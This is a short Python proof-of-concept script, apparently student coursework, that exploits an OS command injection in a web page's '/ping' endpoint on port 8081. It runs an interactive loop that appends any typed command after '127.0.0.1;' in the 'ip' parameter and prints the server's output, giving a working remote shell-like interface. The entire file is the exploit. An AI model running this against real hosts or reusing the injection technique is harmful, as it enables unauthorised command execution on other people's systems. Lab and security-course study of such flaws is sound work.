#!/usr/bin/env python3

'''
Script created for Umbresco webpage OS Command Injection PoC
Cretor: NobodyAtall
Student Name: Leong Wai Chun

run script: python3 poc.py <host ip>
'''
import requests
import sys

if(len(sys.argv) != 2):
    print("python3 poc.py <host ip>")
    sys.exit(0)

host = "http://" + sys.argv[1] + ":8081"
webDir = '/ping'
url = host + webDir


while(True):
    #command injection part
    cmd = input("CMD: ")
    data = {
        "ip":"127.0.0.1;"+cmd 
    }

    #send Get requests
    r = requests.get(url, params=data)
    
    #remove ping result part
    output = r.text.split('\n')[6:]
    for rsl in output:
        print(rsl)



